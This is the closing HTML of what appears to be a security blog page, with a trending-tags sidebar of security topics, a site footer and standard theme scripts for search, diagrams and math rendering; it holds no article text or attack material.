  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/ctf/">ctf</a>
    
      
      <a class="post-tag" href="/tags/php-deserialization/">php deserialization</a>
    
      
      <a class="post-tag" href="/tags/yaml/">yaml</a>
    
      
      <a class="post-tag" href="/tags/exploit-education/">exploit education</a>
    
      
      <a class="post-tag" href="/tags/facebook-ctf/">facebook ctf</a>
    
      
      <a class="post-tag" href="/tags/zip-slip/">zip slip</a>
    
      
      <a class="post-tag" href="/tags/code-security-advent-calendar/">code security advent calendar</a>
    
      
      <a class="post-tag" href="/tags/domgoat/">domgoat</a>
    
      
      <a class="post-tag" href="/tags/drozer/">drozer</a>
    
      
      <a class="post-tag" href="/tags/ghost-xss/">ghost xss</a>
    

    </div>
  </div>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    <!-- The Footer -->

<footer>
  <div class="container pl-lg-4 pr-lg-4">
    <div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3">
      <div class="footer-left">
        <p class="mb-0">
          ¬© 2025
          <a href="https://twitter.com/snoopysecurity">Sam Sanoop</a>.
          
          <span data-toggle="tooltip" data-placement="top"
            title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span>
          
        </p>
      </div>

      <div class="footer-right">
        <p class="mb-0">Using the <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> theme <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>.
        </p>
      </div>
    </div>
  </div>
</footer>


    
      <!--
  mermaid-js loader
-->

<script src="https://cdn.jsdelivr.net/npm/mermaid@9.2.2/dist/mermaid.min.js"></script>

<script>
  (function () {

    function updateMermaid(event) {
      if (event.source === window && event.data &&
        event.data.direction === ModeToggle.ID) {

        const mode = event.data.message;

        if (typeof mermaid === "undefined") {
          return;
        }

        let expectedTheme = (mode === ModeToggle.DARK_MODE ? "dark" : "default");
        let config = {theme: expectedTheme};

        /* Re-render the SVG ‚Ä∫ <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */
        $(".mermaid").each(function () {
          let svgCode = $(this).prev().children().html();
          $(this).removeAttr("data-processed");
          $(this).html(svgCode);
        });

        mermaid.initialize(config);
        mermaid.init(undefined, ".mermaid");
      }
    }

    let initTheme = "default";

    if ($("html[data-mode=dark]").length > 0
      || ($("html[data-mode]").length == 0
        && window.matchMedia("(prefers-color-scheme: dark)").matches)) {
      initTheme = "dark";
    }

    let mermaidConf = {
      theme: initTheme  /* <default|dark|forest|neutral> */
    };

    /* Create mermaid tag */
    $("pre").has("code.language-mermaid").each(function () {
      let svgCode = $(this).children().html();
      $(this).addClass("unloaded");
      $(this).after(`<pre class=\"mermaid\">${svgCode}</pre>`);
    });

    mermaid.initialize(mermaidConf);

    window.addEventListener("message", updateMermaid);
  })();

</script>

    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    
      <div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true"
        data-animation="true" data-autohide="false">
        <div class="toast-header">
          <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close">
            <span aria-hidden="true">&times;</span>
          </button>
        </div>
        <div class="toast-body text-center pt-0">
          <p class="pl-2 pr-2 mb-3">A new version of content is available.</p>
          <button type="button" class="btn btn-primary" aria-label="Update">
            Update
          </button>
        </div>
      </div>
    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No results found.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


    <!--
  JS selector for site.
-->

<!-- layout specified -->


  



  <!-- image lazy-loading & popup & clipboard -->
  

  







  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/lazysizes@5.3.2/lazysizes.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js"></script>






  

  

  







  
    

    

  



  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1.11.6/dayjs.min.js,npm/dayjs@1.11.6/locale/en.min.js,npm/dayjs@1.11.6/plugin/relativeTime.min.js,npm/dayjs@1.11.6/plugin/localizedFormat.min.js"></script>








<script defer src="/assets/js/dist/post.min.js"></script>


  <!-- MathJax -->
  <script>
  /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */
  MathJax = {
    tex: {
      inlineMath: [              /* start/end delimiter pairs for in-line math */
        ['$','$'],
        ['\\(','\\)']
      ],
      displayMath: [             /* start/end delimiter pairs for display math */
        ['$$', '$$'],
        ['\\[', '\\]']
      ]
    }
  };
  </script>
  <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
  <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-chtml.js">
  </script>


<!-- commons -->

<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>




  </body>

</html>

